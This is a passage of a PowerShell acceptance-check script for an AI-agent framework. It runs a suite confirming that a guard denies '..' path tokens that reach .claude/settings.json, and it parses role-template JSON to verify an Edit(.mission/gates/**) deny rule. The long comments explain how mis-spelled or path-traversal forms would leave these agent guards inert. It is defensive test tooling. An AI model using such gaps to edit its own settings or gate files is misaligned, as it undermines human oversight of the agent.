#      renamed, dropped or silently skipped is RED even when the count still reaches five;
#   f) the suite's SUMMARY LINE agrees with the tally: it reads "ALL <n> CHECKS PASSED" with <n>
#      equal to the measured pass count. Exit code, per-check tally and summary line are three
#      INDEPENDENT channels and this member requires all three to agree -- so a suite that exits
#      non-zero while printing a passing summary, or prints a passing summary over a failed
#      check, is RED for saying two different things about itself.
$dotsegPath = Join-Path $nextRoot 'tests\test-dotsegment-forms.ps1'
$h13Present = Test-Path -LiteralPath $dotsegPath
$h13Exit    = $null
$h13Text    = ''
if ($h13Present) {
    $prevEap = $ErrorActionPreference
    $ErrorActionPreference = 'Continue'
    try {
        $h13Out  = & powershell -NoProfile -ExecutionPolicy Bypass -File $dotsegPath 2>&1
        $h13Exit = $LASTEXITCODE
    }
    finally { $ErrorActionPreference = $prevEap }
    $h13Text = ($h13Out | Out-String)
}
$h13Ran       = ($h13Text.Trim().Length -gt 0)
$h13Pass      = @([regex]::Matches($h13Text, '(?m)^\[PASS\] ')).Count
$h13Fail      = @([regex]::Matches($h13Text, '(?m)^\[FAIL\] ')).Count
$h13Total     = $h13Pass + $h13Fail
$h13Ids       = @([regex]::Matches($h13Text, '(?m)^\[(?:PASS|FAIL)\] (\S+)') | ForEach-Object { $_.Groups[1].Value })
$h13FailedIds = @([regex]::Matches($h13Text, '(?m)^\[FAIL\] (\S+)') | ForEach-Object { $_.Groups[1].Value })
$h13Want      = @('F-1', 'F-2', 'F-3', 'F-5', 'F-6')
$h13Missing   = @($h13Want | Where-Object { $h13Ids -notcontains $_ })
$h13Extra     = @($h13Ids  | Where-Object { $h13Want -notcontains $_ })
$h13SetOk     = (($h13Missing.Count -eq 0) -and ($h13Extra.Count -eq 0))
# The suite's own summary line, read off its face and held against the tally derived above. Two
# channels that can disagree are worth more than either alone: this is the conjunct that catches a
# suite whose exit code and whose printed verdict have come apart.
$h13SumMatch  = [regex]::Match($h13Text, '(?m)^\s*ALL (\d+) CHECKS PASSED\s*$')
$h13SumN      = if ($h13SumMatch.Success) { [int]$h13SumMatch.Groups[1].Value } else { -1 }
$h13SumOk     = ($h13SumMatch.Success -and ($h13SumN -eq $h13Pass) -and ($h13Fail -eq 0))
$h13Ok = ($h13Present -and $h13Ran -and ($h13Exit -eq 0) -and ($h13Total -eq 5) -and
          ($h13Fail -eq 0) -and $h13SetOk -and $h13SumOk)
$h13detail = @"
  suite      : $dotsegPath
  present    : $h13Present   (expect True)
  ran        : $h13Ran   (expect True -- the child process produced output)
  exit code  : $(if ($null -eq $h13Exit) { 'n/a -- not run' } else { $h13Exit })   (expect 0 -- the suite's contract is exit 0 = all checks passed)
  checks run : $h13Total   (expect 5 -- F-1 F-2 F-3 F-5 F-6)
  passed     : $h13Pass
  failed     : $h13Fail$(if ($h13FailedIds.Count) { "   -> $($h13FailedIds -join ', ')" })
  id set     : $(if ($h13Ids.Count) { $h13Ids -join ', ' } else { '(none)' })
               missing=$(if ($h13Missing.Count) { $h13Missing -join ',' } else { '(none)' })   unexpected=$(if ($h13Extra.Count) { $h13Extra -join ',' } else { '(none)' })   set equality: $h13SetOk   (expect True)
  summary    : $(if ($h13SumMatch.Success) { "ALL $h13SumN CHECKS PASSED" } else { '(no passing summary line printed)' })   agrees with the tally: $h13SumOk   (expect True)

  WHAT THE SUITE MEASURES, in one line per check, so a RED row is legible without opening it:
    F-1  every leading-'..' spelling produces a form naming its REAL target (the cured defect)
    F-2  interior '..' and rooted paths resolve exactly as they did before the cure
    F-3  every form the pre-cure builder produced is STILL produced (add, never substitute)
    F-5  the real guard DENIES a leading-'..' token reaching .claude/settings.json, naming it
    F-6  validity control: the deny population still denies and the allow population still allows

  WHAT A RED ROW MEANS. present=False: the suite file was deleted, renamed or moved, and this
  member is the only thing in the tree that would notice. ran=False: the child produced nothing --
  a parse error in the suite, or a powershell that would not start. exit<>0 with failed>0: a REAL
  regression in the '..' form builder or in the guard beneath it; the failing ids are named above
  and the suite's whole output is printed below. exit<>0 with failed=0, or a summary line that
  disagrees with the tally: the suite's verdict channels have COME APART and none of them may be
  believed until they agree again. set-equality red: a check was renamed, dropped or skipped --
  the count alone would not have caught it. F-6 red on its own: the apparatus is broken, and every
  other row of that run must be discarded rather than read.
"@
Check -Id 'H-13' -Title "the 5-check '..' form-builder suite is DRIVEN from this instrument rather than orphaned: it runs, exits 0, all five checks F-1 F-2 F-3 F-5 F-6 are present and green by set equality, and the suite's own summary line agrees with its per-check tally" `
      -Ok $h13Ok -Detail $h13detail

if (-not $h13Ok) {
    Write-Host ""
    Write-Host "  --- '..' form-builder suite output (regression detail) ---"
    Write-Host $h13Text
}

# =============================================================================================
# H-12 -- THE PAGE'S PERMISSION-LAYER CLAIM AGREES WITH THE ROLE TEMPLATES IT CITES
# =============================================================================================
# WHY THIS MEMBER IS H-12 AND NOT H-11, AND WHY H-11 STAYS RESERVED. This page RETIRES the id
# H-11 in terms: an earlier revision records "There is no H-11: it was reverted with the cure it could
# not falsify", and that H-11 was the member built for AN EARLIER ROW, reverted together with
# that row's fail-open cure. THE ID STAYS RESERVED FOR AN EARLIER MEMBER. That row was
# retried in this session and was REFUTED A THIRD TIME; the lead is REPORTING THAT ROW OPEN in
# its record and is NOT shipping the exemption, so H-11 is NOT being taken this session and
# THERE IS STILL NO H-11. An id a page explicitly retires for one row must not be silently taken
# by another, or the register carries two different members under one name across two amendments.
# This member was authored as H-11 and is renamed here for that reason alone; nothing about what
# it measures changed with the number.
#
# WHY THIS MEMBER EXISTS. An earlier revision raised an ERRATUM against the register: the register
# spells the gates deny Write(.mission/gates/**); the role templates actually spell it
# Edit(.mission/gates/**); and Write(path) is an INERT spelling that Claude Code accepts, warns
# about at startup and never consults -- worker.json says so on its own face. So the register,
# taken literally, names a rule that would deny NOTHING. That revision also recorded that this
# page's own R-1g paragraph carried the same wrong spelling and deliberately LEFT IT, because
# R-1g is another row's clause. The page is corrected by the session that owns the page; a
# corrected sentence with no detector is the claim-without-a-detector design SS4.5 law 4 forbids,
# and this member IS the detector.
#
# WHY IT LIVES IN WP-1. WP-1 already owns the .mission/gates control territory: H-7 drives the
# command-text route and H-9 drives the gate tool's read-only surface.
# The R-1g sentence names TWO routes; this member drives the other one -- the permission
# layer -- against source rather than against the page's memory of it.
#
# IT IS TWO-SIDED BY CONSTRUCTION, which is the point. Putting Write( back into R-1g fails row
# (g). "Fixing" the page's erratum bullet -- which QUOTES the register's wrong spelling on
# purpose, and is a correct quotation of an incorrect source -- fails row (j). A blanket
# search-and-replace over the page therefore cannot pass this member in either direction, and
# neither can a page edited without reading the JSON.
#
# ---------------------------------------------------------------------------------------------
# THE BOUND OF THIS MEMBER, IN PLAIN LANGUAGE. READ THIS BEFORE EXTENDING IT.
#
# WHAT IT CHECKS. Two things, and only two.
#   1. R-1g's claims agree with the role templates R-1g cites. The templates are PARSED here: the
#      gates rule is the Edit( spelling AND it is an element of the array at the OBJECT PATH
#      permissions.deny of each template; R-1g calls that rule a DENY and never a grant; and
#      every file:line R-1g prints pairs with the claim it stands nearest to and re-derives from
#      the JSON.
#   2. The page's ROW 172 bullet still carries the erratum -- the register's wrong spelling,
#      quoted once, attributed to the register, with the corrected spelling attributed to the
#      actual rule beside it -- checked INSIDE THAT ONE BULLET'S SPAN and nowhere else.
#
# WHAT IT DOES NOT CHECK, AND CANNOT. It does NOT check that every OTHER mention of the wrong
# spelling anywhere on this page is a REPORT of the erratum rather than an ASSERTION of it. That
# is a claim about MEANING, not about text, and a text member cannot decide it. IT WAS ATTEMPTED
# TWICE AND BOTH ATTEMPTS WERE REFUTED BY DRIVING THEM. THE TWO ATTEMPTS ARE RECORDED HERE SO A
# LATER SEAT DOES NOT BUILD A THIRD.
#
#   ATTEMPT 1 -- "the string occurs EXACTLY ONCE page-wide, inside the ROW 172 bullet". REFUTED:
#     this page exists to ACCUMULATE amendments, and a faithful report of this erratum has to
#     quote the wrong spelling to report it at all. A three-line simulated amendment-38 bullet
#     quoting it once made the rows read occurrences=2 and page-wide 2313,2326, and the member
#     went red against a page that had done nothing wrong.
#
#   ATTEMPT 2 -- "every LINE carrying the string sits in a top-level bullet that ALSO carries the
#     literal Edit(.mission/gates/**)". This only RELOCATED the forward break; it did not remove
#     it, and it hollowed the rule out. Driven, three ways:
#       (a) HONEST WRITING STILL WENT RED. Three realistic amendment-38 shapes failed, two of them
#           written in conventions THIS PAGE ITSELF STATES AND USES -- the cross-reference
#           convention ("The clause text for each row is written where the member it governs is
#           documented, not here"), and R-1g's own Edit-paren shorthand idiom. Each printed
#           "unaccompanied: <line>" and took WP-1 to 1 of 22 FAILED, EXIT 1, against a page that
#           reported the erratum faithfully and instantiated it nowhere.
#       (b) A FALSEHOOD PASSED. A bullet asserting that validator.json denies the Write spelling
#           and that "both spellings are live and neither is inert" -- a claim that INSTANTIATES
#           the wrong spelling and contradicts three rows measured in the same run -- passed,
#           because the bullet also happened to carry the Edit literal somewhere in its span.
#       (c) IT COUNTED LINES, NOT OCCURRENCES. A second occurrence added on the SAME line inside
#           the ROW 172 bullet, falsely asserting "and so do BOTH ROLE TEMPLATES" -- which
#           destroys the erratum's quotation -- left the member green, all 22 passed, EXIT 0.
#
#   THE RULING (lead, this session). A rule that reds honest writing while greening a falsehood is
#   a defect in the RULE. THE PAGE-WIDE PROSE INVARIANT IS WITHDRAWN. It is not replaced. What
#   remains is narrower and is true.
#
# ---------------------------------------------------------------------------------------------
# ROUND 5 -- FOUR FINDINGS, ALL DRIVEN AT THE ROUND-4 TIP BEFORE ANY LINE OF THE CURE WAS
# WRITTEN. THEY ARE RECORDED HERE BECAUSE EACH ONE IS A PROPERTY THIS MEMBER'S TITLE ASSERTED
# WHILE THE CODE DID NOT DRIVE IT.
#
#   FINDING -- THE DENY ARRAY WAS LOCATED BY A STRING, AND THE TITLE SAID permissions.deny.
#     Rows (a)/(b) located a bracket RANGE under the first line containing the substring
#     "deny": [ and never checked that the array so found IS the array at the object path
#     permissions.deny. Driven GREEN at 22/22, EXIT 0, twice, against BYTE-VALID JSON with not one
#     line moved and the Edit literal still at :13 in both templates:
#       * renaming the containing key "permissions" to "permissionz" in orchestrator.json AND
#         worker.json -- the member printed "deny array lines 8..18" and the gates deny was
#         enforced by nothing at all;
#       * reparenting the same array under permissions._archive (the "defaultMode" line becomes
#         "_archive": { and the array's close becomes ]} ) -- same result, GREEN.
#     CLOSED BY PARSING. Both templates are now handed to ConvertFrom-Json (PS 5.1 ships it; it
#     returns a PSCustomObject and -AsHashtable does NOT exist in 5.1, so nothing here reaches for
#     it), the object path permissions.deny is walked property by property, and the rule must be
#     an ELEMENT of that array by ordinal string equality. The located LINE range is kept, because
#     the page cites line numbers and they have to come from somewhere -- but it is now BOUND to
#     the parsed array: the quoted strings between the open and close lines must be exactly the
#     elements the parser found, same count and same members. A renamed or reparented key reds.
#
#   FINDING -- THE PAGE-SIDE VERB WAS NEVER BOUND. R-1g could be rewritten to call the gates
#     rule a GRANT -- "the permission layer's Edit(.mission/gates/**) GRANT", "The GRANT as it
#     actually reads, inside each template's allow list, is ..." -- with every citation still
#     re-deriving, and the member stayed GREEN, 22/22, EXIT 0. A member whose title says the rule
#     R-1g calls the gates DENY must fail when R-1g calls it the opposite.
#     CLOSED BY ROW (k). The SENTENCES of the R-1g span that carry the Edit(.mission/gates/**)
#     literal are taken as the sentences that characterise the rule. At least one of them must
#     carry a DENY word, NONE of them may carry a GRANT word, and the parsed templates must agree
#     that the rule sits in deny. The lexicon is fixed and is printed in the detail so no reader
#     has to guess it.
#     THE BOUND, STATED RATHER THAN HIDDEN: the GRANT-word ban is scoped to the sentences that
#     carry the literal, NOT to the span. The span legitimately says "grant" elsewhere today (the
#     validator's "only file-write grant is its own result file"), and a span-wide ban would have
#     reded the true page -- measured: 1 grant-word in the span, 0 in either literal-bearing
#     sentence. The cost is that a future sentence which BOTH carries the literal AND mentions an
#     allow list for some other reason reds this row. The cure is one sentence boundary: say the
#     allow-list thing in its own sentence. That is a real constraint and it is disclosed.
#
#   FINDING -- AN HONEST SENTENCE SPLIT REDDED A FACTUALLY CORRECT PAGE, WITH A DIAGNOSIS THAT
#     SAID THE OPPOSITE. Row (h) used to bind each claim to the citations appearing IN THE SAME
#     SENTENCE as the claim's needle, and required set equality with the measured line. Driven:
#       * splitting one true sentence into two -- "... at orchestrator.json:13. It reads
#         identically at worker.json:13. Both were measured at ..." -- both citations still TRUE
#         and still inside R-1g, printed "worker.json <the gates deny> cites (none), source
#         measures 13" and took WP-1 to 1 of 22 FAILED, EXIT 1. The page cites worker.json:13. The
#         diagnosis said it cites nothing.
#       * adding the TRUE validator.json allow-list citation :8-15 INSIDE the sentence that
#         already carries the deny-array citation printed "cites 16-25,8-15, source measures
#         16-25" and reded. That is a round-4 finding reappearing one layer down.
#     CLOSED BY MEASURING DISTANCE INSTEAD OF SENTENCE MEMBERSHIP. For each claim, every citation
#     of THAT CLAIM'S FILE anywhere in the span is measured for its character gap to the nearest
#     occurrence of that claim's needle in the flattened span, and the NEAREST citation must be
#     the line source measures. A split moves a citation to the next sentence and changes its gap
#     by a handful of characters; it does not change which citation is nearest. A new citation
#     further from the needle than the bound one is simply not the nearest, so it is green however
#     new it is, including inside the binder sentence. EXCHANGE, ROT, DELETION AND A JSON-SIDE
#     MOVE ALL STILL RED, because each of them changes what the nearest citation IS.
#     THE BOUND: nearness is a proxy for attribution. A new sentence that repeats a claim's needle
#     immediately beside a DIFFERENT line of the same file reds that claim -- which is the right
#     answer if that sentence is mis-attributing, and the wrong one if it is merely restating. It
#     is stated here so nobody has to discover it.
#
#   FINDING -- A WORDING DEFECT. The header and the detail both said each span ends at "the next
#     TOP-LEVEL BULLET, whichever heading that turns out to be". THE CODE ENDS A SPAN AT THE NEXT
#     LINE WHOSE FIRST FOUR CHARACTERS ARE THE LITERAL '- **', and that is narrower than the
#     page's own idea of a top-level bullet: measured on this page, 82 lines begin '- ' and only
#     43 of them begin '- **', so 39 top-level bullets do NOT end a span. The wording is corrected
#     rather than the code: '- **' is the page's amendment-row convention and is what the cure
#     below tells the next seat to type. Both figures are re-measured on every run and printed in
#     the detail, so the statement cannot go stale silently.
#
# ---------------------------------------------------------------------------------------------
# FOR THE SEAT WRITING THE NEXT AMENDMENT: THE ONE SHAPE THAT MOVES THIS MEMBER, AND THE CURE.
#
# An earlier draft of this member claimed, here and in its detail text, that "NEW AMENDMENT
# SECTIONS ANYWHERE ON THIS PAGE DO NOT MOVE THIS MEMBER". THAT WAS AN OVERCLAIM and it is
# corrected here rather than defended. It is true that nothing this member measures quantifies
# over the whole document. It is NOT true that placement is free, because each of the two spans
# ENDS AT THE NEXT LINE STARTING WITH THE LITERAL '- **' -- which is the span-boundary repair
# below, working as designed -- so prose written beside a bullet WITHOUT SUCH A LINE OF ITS OWN
# is inside that bullet.
#
#   THE SHAPE THAT REDS IT. A carry-forward paragraph placed after the ROW 172 bullet's last line
#   and before the next line starting '- **', with no '- **' opening of its own, that quotes
#   Write(.mission/gates a second time. Row (j) requires exactly ONE occurrence in that span.
#   Driven this round: an honest three-line amendment-38 carry-forward written beside the bullet
#   took ROW 172 Write occurrences to 2, reded (j), and took WP-1 to 1 of 22 FAILED, EXIT 1.
#
#   THE CURE, AND IT IS FOUR CHARACTERS. Open the carry-forward with '- **'. Such a line is
#   outside both spans and may quote either spelling as often as it likes -- including
#   immediately after ROW 172. That shape was driven and is GREEN, all 22, EXIT 0.
#
# So the honest statement is not "the next amendment is unconstrained by this member"; it is that
# the next amendment is constrained in exactly one way, the way is structural rather than editorial,
# and the page's own convention -- every amendment row opens '- **' -- already satisfies it. A
# continuation paragraph inside R-1g is constrained differently and by content, not placement: no
# Write(.mission/gates at all (row g), no GRANT word in a sentence that carries the gates literal
# (row k), and any role-template citation added there must resolve against the file it names and
# must not come to stand nearer a bound claim's needle than that claim's own citation (row h).
#
# TWO REPAIRS FROM THE SAME DRIVING WERE KEPT, BECAUSE THEY HELD UNDER BOTH ROUNDS OF ATTACK.
#
#   THE SPAN BOUNDARY. An earlier draft ended the ROW 172 span at the line before the literal
#   heading '- **ROW 129 ', so anything appended after ROW 172 fell INSIDE it. Both spans now end
#   at the next line starting with the literal '- **'. The end of a span is a structural fact
#   about the document, not a guess about which sibling comes next.
#
#   EVERY CITATION IS BOUND TO A MEASUREMENT. An earlier draft took the FIRST regex match of
#   worker.json:(\d+) inside the R-1g span -- the derivation citation :13 -- and never bound the
#   quote-attribution :35 to anything. Driven: rewriting the page's worker.json:35 to :99 left
#   every row True and the member green, which is precisely the citation rot this member was built
#   to stop. The repair after that driving was a SET equality in both directions; ROUND 4 replaced
#   it with a per-sentence pairing, and ROUND 5 replaced THAT with the nearest-citation pairing in
#   the round-5 finding above, because sentence membership broke on an honest sentence split. What survives
#   unchanged through all three shapes is the principle -- no citation on the page is trusted,
#   every anchor is measured in the JSON, and a citation that rots, is deleted, is exchanged with
#   another claim's, or names an anchor that MOVED in the JSON turns the row red.
#
# WHAT ROW (j) CAN AND CANNOT DO. Row (j) is a TEXT test over a quotation whose source it is
# forbidden to read: .mission/** is out of bounds to this build, so the member cannot compare
# the erratum bullet's quotation against the register's actual bytes. Counting the string alone was
# weaker still -- an editor who kept the literal string but INVERTED the erratum, saying the
# templates spell it Write( and the register spells it Edit(, would have passed. Row (j) therefore
# binds ORIENTATION as well as presence: the wrong spelling must follow the words that ATTRIBUTE
# it to the register, and the corrected spelling must follow the words that attribute it to the
# actual rule. It also counts OCCURRENCES rather than lines, so a second occurrence smuggled onto
# the same line cannot hide -- that was refutation (c) above. It does NOT catch an inversion
# phrased in wording this regex does not model, and it cannot certify the quotation is faithful to
# the register. Those bounds are real and are stated here, not papered over.
#
# THE REGISTER ITSELF IS NOT TOUCHED AND IS NOT READ HERE. .mission/** is out of bounds to this
# build; the erratum against the register is REPORTED for the recording seat, not fixed.
# THE PAGE. docs/framework/LAM-ACCEPT.md left the tree: it is the first host's acceptance record, not a
# framework document, and it stays readable in this repository's history. H-12 reads it as v0.2.0 carries it, held to
# its sha256: at its path where a project an earlier release installed keeps it in place, else <commit>:<path> from
# this checkout's history -- the kept copy held after install.ps1's fold, every CR LF made LF; where neither holds it,
# H-12 SKIPS by name: its page is the host's record, which a project the framework installs does not hold.
$h12DocRel  = 'docs/framework/LAM-ACCEPT.md'
$h12DocPin  = 'd38a1993b56724489e9925901a912080c1af233b703b2292320245facf186dc7'
$h12DocRev  = '11ca1e842a8c1f0a5716d1a11cc81627825bc42b'
$h12DocText = $null
$h12DocFrom = ''
$h12DocDisk = Join-Path $repoRoot 'docs\framework\LAM-ACCEPT.md'
$h12Hasher  = [System.Security.Cryptography.SHA256]::Create()
try {
    if (Test-Path -LiteralPath $h12DocDisk -PathType Leaf) {
        $h12DocB = [System.IO.File]::ReadAllBytes($h12DocDisk)
        if ([System.Array]::IndexOf($h12DocB, [byte]0) -lt 0) { $h12L1 = [System.Text.Encoding]::GetEncoding(28591); $h12DocB = $h12L1.GetBytes($h12L1.GetString($h12DocB).Replace("`r`n", "`n")) }
        if (([BitConverter]::ToString($h12Hasher.ComputeHash($h12DocB))).Replace('-', '').ToLowerInvariant() -ceq $h12DocPin) {
            $h12DocText = [System.Text.Encoding]::UTF8.GetString($h12DocB); $h12DocFrom = "$h12DocRel in this checkout, at its sha256 after the fold"
        }
    }
    if ($null -eq $h12DocText) {
        $h12Psi = New-Object System.Diagnostics.ProcessStartInfo
        $h12Psi.FileName = 'git'; $h12Psi.Arguments = '-C "' + $repoRoot + '" cat-file blob ' + $h12DocRev + ':' + $h12DocRel
        $h12Psi.UseShellExecute = $false; $h12Psi.RedirectStandardOutput = $true; $h12Psi.RedirectStandardError = $true; $h12Psi.CreateNoWindow = $true
        foreach ($h12Var in @('GIT_DIR', 'GIT_WORK_TREE', 'GIT_INDEX_FILE', 'GIT_COMMON_DIR', 'GIT_OBJECT_DIRECTORY')) {
            if ($h12Psi.EnvironmentVariables.ContainsKey($h12Var)) { $h12Psi.EnvironmentVariables.Remove($h12Var) }
        }
        $h12Proc = [System.Diagnostics.Process]::Start($h12Psi)
        $h12ErrTask = $h12Proc.StandardError.ReadToEndAsync()
        $h12Ms = New-Object System.IO.MemoryStream
        $h12Proc.StandardOutput.BaseStream.CopyTo($h12Ms)
        $h12Proc.WaitForExit()
        [void]$h12ErrTask.Result
        $h12DocB = $h12Ms.ToArray()
        if (($h12Proc.ExitCode -eq 0) -and (([BitConverter]::ToString($h12Hasher.ComputeHash($h12DocB))).Replace('-', '').ToLowerInvariant() -ceq $h12DocPin)) {
            $h12DocText = [System.Text.Encoding]::UTF8.GetString($h12DocB); $h12DocFrom = "this repository's history, git $($h12DocRev.Substring(0, 8)):$h12DocRel, at its sha256"
        }
    }
} catch { $h12DocText = $null } finally { $h12Hasher.Dispose() }
$h12Orch = Join-Path $repoRoot 'tools\lam\settings\orchestrator.json'
$h12Work = Join-Path $repoRoot 'tools\lam\settings\worker.json'
$h12Vald = Join-Path $repoRoot 'tools\lam\settings\validator.json'

$h12Inputs = [ordered]@{
    'tools/lam/settings/orchestrator.json' = $h12Orch
    'tools/lam/settings/worker.json'       = $h12Work
    'tools/lam/settings/validator.json'    = $h12Vald
}
$h12Absent = @()
foreach ($h12k in $h12Inputs.Keys) {
    if (-not (Test-Path -LiteralPath $h12Inputs[$h12k])) { $h12Absent += $h12k }
}
$h12Reached = ($h12Absent.Count -eq 0) -and ($null -ne $h12DocText)

$h12EditNeedle  = 'Edit(.mission/gates/**)'
$h12WriteNeedle = 'Write(.mission/gates'
$h12GatesNeedle = '.mission/gates'
$h12InertQuote  = 'Write(path) is not matched by file permission checks'

$h12DocLines  = @()
$h12OrchLines = @()
$h12WorkLines = @()
$h12ValdLines = @()
if ($h12Reached) {
    $h12DocLines  = @(($h12DocText -replace "`r?`n\z", '') -split "`r?`n")
    $h12OrchLines = @(Get-Content -LiteralPath $h12Orch -Encoding UTF8)
    $h12WorkLines = @(Get-Content -LiteralPath $h12Work -Encoding UTF8)
    $h12ValdLines = @(Get-Content -LiteralPath $h12Vald -Encoding UTF8)
}

# --- the JSON ground truth, measured rather than quoted from anywhere -------------------------
$h12OrchEdit = @(); $h12OrchWrite = @()
for ($i = 0; $i -lt $h12OrchLines.Count; $i++) {
    if ($h12OrchLines[$i].Contains($h12EditNeedle))  { $h12OrchEdit  += ($i + 1) }
    if ($h12OrchLines[$i].Contains($h12WriteNeedle)) { $h12OrchWrite += ($i + 1) }
}
$h12WorkEdit = @(); $h12WorkWrite = @()
for ($i = 0; $i -lt $h12WorkLines.Count; $i++) {
    if ($h12WorkLines[$i].Contains($h12EditNeedle))  { $h12WorkEdit  += ($i + 1) }
    if ($h12WorkLines[$i].Contains($h12WriteNeedle)) { $h12WorkWrite += ($i + 1) }
}
$h12ValdGates = @()
for ($i = 0; $i -lt $h12ValdLines.Count; $i++) {
    if ($h12ValdLines[$i].Contains($h12GatesNeedle)) { $h12ValdGates += ($i + 1) }
}
$h12WorkInert = @()
for ($i = 0; $i -lt $h12WorkLines.Count; $i++) {
    if ($h12WorkLines[$i].Contains($h12InertQuote)) { $h12WorkInert += ($i + 1) }
}

# --- THE DENY ARRAY, BOUND BY ITS OBJECT PATH AND NOT BY A SUBSTRING OF A LINE ----------------
# A ROUND-5 FINDING, DRIVEN GREEN TWICE BEFORE IT WAS CLOSED (see the header). What follows does
# two separate things and the distinction matters:
#   * IT PARSES. ConvertFrom-Json, then permissions -> deny walked as PROPERTIES. The rule must be
#     an ELEMENT of that array by ordinal equality. Rename or reparent the key and this fails --
#     which is what the member's own title has always claimed to measure.
#   * IT LOCATES A LINE RANGE, because the page cites line numbers and row (h) has to check them.
#     The range is found from the "deny": [ key line to the first following line whose trimmed
#     text is ] or ], -- worker.json's deny array is followed by an allow list, so it closes with
#     a comma. Exactly one "deny": [ per template is required, so a second cannot be introduced to
#     host the rule elsewhere. AND THE RANGE IS THEN BOUND TO THE PARSE: the quoted strings lying
#     between open and close must be exactly the elements ConvertFrom-Json found, same count and
#     same members. A line range that is not the parsed array's own lines is not usable evidence.
$h12DenySrc = [ordered]@{
    'orchestrator.json' = $h12OrchLines
    'worker.json'       = $h12WorkLines
    'validator.json'    = $h12ValdLines
}
$h12DenyOpenAt  = @{}
$h12DenyCloseAt = @{}
$h12DenyKeyN    = @{}
foreach ($h12dk in @($h12DenySrc.Keys)) {
    $h12dl    = $h12DenySrc[$h12dk]
    $h12dOpen = 0
    $h12dClose = 0
    $h12dN    = 0
    for ($i = 0; $i -lt $h12dl.Count; $i++) {
        if ($h12dl[$i].Contains('"deny": [')) {
            $h12dN++
            if ($h12dOpen -eq 0) { $h12dOpen = $i + 1 }
        }
    }
    if ($h12dOpen -gt 0) {
        for ($i = $h12dOpen; $i -lt $h12dl.Count; $i++) {
            $h12dt = $h12dl[$i].Trim()
            if (($h12dt -eq ']') -or ($h12dt -eq '],')) { $h12dClose = $i + 1; break }
        }
    }
    $h12DenyOpenAt[$h12dk]  = $h12dOpen
    $h12DenyCloseAt[$h12dk] = $h12dClose
    $h12DenyKeyN[$h12dk]    = $h12dN
}

# THE PARSE. Each template is handed to ConvertFrom-Json and the object path permissions.deny is
# walked property by property. -ccontains is used on the property-name list so a case-variant key
# is not silently accepted as the one the page names.
$h12PathOk   = @{}
$h12DenyArr  = @{}
$h12ParseBad = @()
foreach ($h12jk in @($h12DenySrc.Keys)) {
    $h12PathOk[$h12jk]  = $false
    $h12DenyArr[$h12jk] = @()
    if (-not $h12Reached) { continue }
    $h12jtext = ($h12DenySrc[$h12jk] -join ([string][char]10))
    $h12jobj  = $null
    try {
        $h12jobj = ConvertFrom-Json $h12jtext -ErrorAction Stop
    } catch {
        $h12ParseBad += ($h12jk + ' does not parse as JSON')
        $h12jobj = $null
    }
    if ($null -eq $h12jobj) { continue }
    if (-not ($h12jobj.PSObject.Properties.Name -ccontains 'permissions')) {
        $h12ParseBad += ($h12jk + ' has no top-level "permissions" object')
        continue
    }
    $h12jperm = $h12jobj.permissions
    if ($null -eq $h12jperm) { $h12ParseBad += ($h12jk + ' permissions is null'); continue }
    if (-not ($h12jperm.PSObject.Properties.Name -ccontains 'deny')) {
        $h12ParseBad += ($h12jk + ' has no permissions.deny array')
        continue
    }
    $h12jdeny = $h12jperm.deny
    if (-not ($h12jdeny -is [System.Array])) {
        $h12ParseBad += ($h12jk + ' permissions.deny is not an array')
        continue
    }
    $h12PathOk[$h12jk]  = $true
    $h12DenyArr[$h12jk] = @($h12jdeny)
}

# THE RULE MUST BE AN ELEMENT OF THE PARSED ARRAY, by ordinal string equality.
$h12DenyHas = @{}
foreach ($h12jk in @($h12DenySrc.Keys)) {
    $h12n = 0
    foreach ($h12el in @($h12DenyArr[$h12jk])) {
        if (($h12el -is [string]) -and ([string]::Equals($h12el, $h12EditNeedle, [System.StringComparison]::Ordinal))) { $h12n++ }
    }
    $h12DenyHas[$h12jk] = $h12n
}

# THE LOCATED LINE RANGE MUST BE THE PARSED ARRAY'S OWN LINES.
$h12RangeBound = @{}
foreach ($h12jk in @($h12DenySrc.Keys)) {
    $h12rb = $false
    $h12ro = $h12DenyOpenAt[$h12jk]
    $h12rc = $h12DenyCloseAt[$h12jk]
    if ($h12PathOk[$h12jk] -and ($h12DenyKeyN[$h12jk] -eq 1) -and ($h12ro -gt 0) -and ($h12rc -gt $h12ro)) {
        $h12rtext = ''
        if ($h12rc -gt ($h12ro + 1)) { $h12rtext = ($h12DenySrc[$h12jk][$h12ro..($h12rc - 2)] -join ([string][char]10)) }
        $h12rq = @()
        foreach ($h12rm in [regex]::Matches($h12rtext, '"([^"]*)"')) { $h12rq += $h12rm.Groups[1].Value }
        $h12rarr = @($h12DenyArr[$h12jk])
        $h12rb = ($h12rq.Count -eq $h12rarr.Count)
        if ($h12rb) {
            foreach ($h12el in $h12rarr) {
                if (-not ($h12rq -ccontains $h12el)) { $h12rb = $false }
            }
        }
    }
    $h12RangeBound[$h12jk] = $h12rb
}

$h12OrchInDeny = $false
if (($h12DenyKeyN['orchestrator.json'] -eq 1) -and
    ($h12DenyCloseAt['orchestrator.json'] -gt $h12DenyOpenAt['orchestrator.json']) -and
    ($h12OrchEdit.Count -eq 1)) {
    $h12OrchInDeny = (($h12OrchEdit[0] -gt $h12DenyOpenAt['orchestrator.json']) -and
                      ($h12OrchEdit[0] -lt $h12DenyCloseAt['orchestrator.json']))
}
$h12WorkInDeny = $false
if (($h12DenyKeyN['worker.json'] -eq 1) -and
    ($h12DenyCloseAt['worker.json'] -gt $h12DenyOpenAt['worker.json']) -and
    ($h12WorkEdit.Count -eq 1)) {
    $h12WorkInDeny = (($h12WorkEdit[0] -gt $h12DenyOpenAt['worker.json']) -and
                      ($h12WorkEdit[0] -lt $h12DenyCloseAt['worker.json']))
}
$h12DenyShowOrch = '' + $h12DenyOpenAt['orchestrator.json'] + '..' + $h12DenyCloseAt['orchestrator.json']
$h12DenyShowWork = '' + $h12DenyOpenAt['worker.json'] + '..' + $h12DenyCloseAt['worker.json']

# --- the page's '- **' bullet structure -------------------------------------------------------
# EVERY span below ends at the next line whose first four characters are the literal '- **'. That
# is the span-boundary repair above: an end anchor spelled as one specific heading swallows
# anything appended to the section before it. SAY WHAT THE CODE DOES AND NOT MORE (round-5
# finding): '- **' is NARROWER than "a top-level bullet". Both counts are measured here and
# printed in the detail, so the gap between the two is a figure on the page rather than a
# sentence somebody has to believe.
$h12BulletStarts = @()
$h12DashLines    = 0
for ($i = 0; $i -lt $h12DocLines.Count; $i++) {
    if ($h12DocLines[$i].StartsWith('- '))   { $h12DashLines++ }
    if ($h12DocLines[$i].StartsWith('- **')) { $h12BulletStarts += $i }
}
$h12DashOnly = $h12DashLines - $h12BulletStarts.Count

